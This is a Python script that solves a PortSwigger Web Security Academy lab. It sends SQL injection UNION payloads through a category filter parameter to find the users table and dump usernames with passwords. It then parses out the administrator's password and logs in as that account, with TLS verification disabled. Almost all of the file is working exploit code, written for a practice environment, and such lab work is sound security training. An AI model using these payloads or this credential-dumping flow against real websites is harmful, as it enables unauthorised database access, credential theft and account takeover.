# Lab name: Lab: SQL injection UNION attack, retrieving multiple values in a single column
# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

req = requests.Session()

proxies = {
    'http':'http://127.0.0.1:8080', 
    'https':'http://127.0.0.1:8080'
}

admin_username = 'administrator'
password = ''

poc_payload_for_users_table = "'union+SELECT+null,TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+like+'%25users%25'--"
payload_to_get_users_with_passwords = "='union+SELECT+null,CONCAT(username,'%23',password)+FROM+users--"



def filter_url():
    global url
    url = (url.split('.net', 1)[0]) + f'.net/filter?category={poc_payload_for_users_table}'
        


def get_administrator_password(response):
    password = ((response.text.split(admin_username)[1])
           .split('</th>',1)[0]).replace('#','').strip()
    return password

def get_csrf_token_from_response(url):
    response = req.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input')['value']
    return csrf_token

def login_as_administrator(username, password):
    login_url = (url.split('.net', 1)[0]) + '.net/login'
    csrf = get_csrf_token_from_response(login_url)
    data = {
        'csrf':csrf,
        'username': username,
        'password': password
    }
    response = req.post(url=login_url, data=data, proxies=proxies, verify=False)
    if '/my-account?id=administrator' in response.text:
        print(f'Lab solved successfully and username: {admin_username}, password: {password}', end='')
    elif response.status_code == 504:
        print('Lab is not available, please refresh the url')
    else:
        print(f'failed to login but username: {admin_username}, password: {password} try to login yourself', end='')        
    print()
    exit(0)


url = input('Enter lab url: ')

filter_url()

response = req.get(url, proxies=proxies, verify=False)


if 'users' in response.text:
    url = url.split('=', 1)[0]
    url += f"{payload_to_get_users_with_passwords}"
    response = req.get(url, proxies=proxies, verify=False)
    if admin_username in response.text:
        password = get_administrator_password(response)
        login_as_administrator(admin_username, password)
            
    print(f'Error failed to find {admin_username}')
    exit(0)
print(f'Error failed to find users table')

